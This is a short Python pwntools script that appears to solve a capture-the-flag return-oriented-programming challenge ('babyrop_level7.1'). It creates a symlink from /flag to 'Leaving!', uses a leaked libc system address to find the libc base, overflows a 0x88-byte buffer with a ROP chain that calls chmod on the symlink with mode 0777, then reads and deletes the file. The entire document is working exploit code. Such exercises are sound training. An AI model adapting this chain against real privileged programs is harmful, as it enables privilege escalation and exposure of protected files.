from pwn import *


challenge_name = '/challenge/babyrop_level7.1'
libc_name = '/lib/x86_64-linux-gnu/libc.so.6'
buf_size = 0x88 
leaving_addr = 0x402041

#### CREATE SYMBOLIK LINK LEAVING

p = process(["ln", '-s', '/flag', 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

###############################################3

           
libc_elf = ELF(libc_name)
system_offset_libc = libc_elf.symbols['system']
chmod_offset_libc = libc_elf.symbols['chmod']

elf = ELF(challenge_name) 
rop = ROP(elf)  
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]  


p = process([challenge_name])
leak_line = p.recvline_contains(b'[LEAK]')
system_addr = int(leak_line.split(b'is: ')[1][:-1], 16)
base_addr = system_addr - system_offset_libc



payload = buf_size * b'A'


#### Chmod ##########

payload += p64(pop_rdi)
payload += p64(leaving_addr)    
payload += p64(pop_rsi)
payload += p64(0o777) 
payload += p64(0o777)    
payload += p64(chmod_offset_libc + base_addr)

########SENDING PAYLOAD##########

p.send(payload)

answer = p.clean()
print(answer.decode(errors='ignore'))

#############################################

p = process(["/usr/bin/cat", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))

p = process(["rm", 'Leaving!'])
answer = p.clean()
print(answer.decode(errors='ignore'))